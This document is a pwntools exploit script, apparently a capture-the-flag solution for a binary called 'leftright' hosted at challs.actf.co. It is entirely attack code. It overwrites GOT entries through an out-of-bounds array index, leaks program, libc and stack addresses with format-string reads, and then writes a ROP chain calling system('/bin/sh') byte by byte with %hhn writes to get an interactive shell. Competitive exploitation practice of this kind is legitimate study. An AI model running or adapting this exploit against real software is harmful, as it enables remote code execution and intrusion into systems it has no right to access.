from pwn import *
from time import sleep
from tqdm import tqdm

libc = ELF("./libc.so.6")
if args.REMOTE:
    name = "./leftright"
else:
    name = "./patched"
context.binary = file = ELF(name)
context.terminal = ["kitty"]
gdbscript = """
c
"""

if args.REMOTE:
    p = remote("challs.actf.co", "31324")
    assume = 0
else:
    p = gdb.debug(name, gdbscript=gdbscript, aslr=False)
    assume = 5

overwrite_exit_offset = (file.got.exit - file.sym.arr) & 0xffff
overwrite_puts_offset = (file.got.puts - file.sym.arr) & 0xffff

p.sendline(b"meow")
step = 10000
for i in tqdm(range(0, overwrite_puts_offset - overwrite_puts_offset % step, step)):
    p.send(b"1\n" * step)
    for _ in range(step):
        p.recvline()
p.send(b"1\n" * (overwrite_puts_offset % step))
for _ in range(overwrite_puts_offset % step):
    p.recvline()

p.send(b"2\n\x70")
p.send(b"1\n")
p.send(b"2\n" + p8(assume << 4))

for i in tqdm(range(0x38 - 1)):
    p.sendline(b"1")
    p.recvline()

p.send(b"2\n\xb9")
p.send(b"1\n")
p.send(b"2\n" + p8((assume << 4) | 1))

for i in tqdm(range(file.sym.arr - file.got.exit - 1)):
    p.sendline(b"1")
    p.recvline()

p.send(b"0\n")
# leak main+0x1b7
p.send(b"%13$p\n")
p.send(b"3\n")

p.recvuntil(b"bye")
leak = int(p.recvline(), 0)
filebase = leak - 0x129c
log.info(f"{filebase = :#x}")

p.send(b"0\n")
p.send(b"%21$p\n")
p.send(b"3\n")

p.recvuntil(b"bye")
leak = int(p.recvline(), 0)
libcbase = leak - 0x29d90
log.info(f"{libcbase = :#x}")

p.send(b"0\n")
p.send(b"%25$p\n")
p.send(b"3\n")

p.recvuntil(b"bye")
leak = int(p.recvline(), 0)
retaddr = leak - 0x70 - 0xa0
log.info(f"{retaddr = :#x}")

poprdi = 0x000000000002a3e5
chain =  p64(libcbase + poprdi)
chain += p64(libcbase + next(libc.search(b"/bin/sh\x00")))
chain += p64(libcbase + poprdi + 1)
chain += p64(libcbase + libc.sym.system)

for i, byte in enumerate(chain):
    p.send(b"0\n")
    p.sendline(p64(retaddr + i))
    p.send(b"0\n")
    if byte == 0:
        payload = b""
    else:
        payload = f"%{byte}c".encode()
    payload += b"%16$hhn"
    p.sendline(payload)

p.send(b"3\n" * len(chain) * 2)
p.send(b"3\n")

p.interactive()